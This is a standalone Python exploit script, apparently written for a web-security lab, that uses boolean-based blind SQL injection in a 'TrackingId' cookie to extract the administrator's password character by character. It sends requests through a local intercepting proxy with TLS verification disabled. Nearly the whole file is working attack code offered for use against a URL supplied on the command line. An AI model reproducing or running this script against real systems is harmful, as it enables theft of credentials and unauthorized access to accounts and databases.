import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def sqli_password(url):
   password_extracted = ""
   for i in range(1, 21):
      for j in range (32,126):
         sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--'" % (i,j)
         sqli_payload_encoded = urllib.parse.quote(sqli_payload)
         cookies = {'TrackingId': '9REHpRJZ9bZh5HvH' + sqli_payload_encoded, 'session': 'WrHKSyi8F7eCoQPoqyVsZJpQU7fTFEBI'}
         try:
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if i == 1 and j == 32:
               print(f"Debug: Status {r.status_code}, Response snippet: {r.text[:200]}")
            if "Welcome" not in r.text:
               sys.stdout.write('\r' + password_extracted)
               sys.stdout.flush()
            else:
               password_extracted += chr(j)
               sys.stdout.write('\r' + password_extracted)
               sys.stdout.flush()
               break
         except Exception as e:
            print(f"Error on position {i}, char {j}: {e}")
            break
      else:
         # If no char found for this position, stop
         break

def main():
   if len(sys.argv) != 2:
      print("(+) Usage: %s <url>" % sys.argv[0])
      print("(+ )Example: %s http://target.com/vulnerable_endpoint" % sys.argv[0])
      sys.exit(1)

   url = sys.argv[1]
   print("(+) Retrieving administrator password...")
   sqli_password(url)


if __name__ == "__main__":
   main()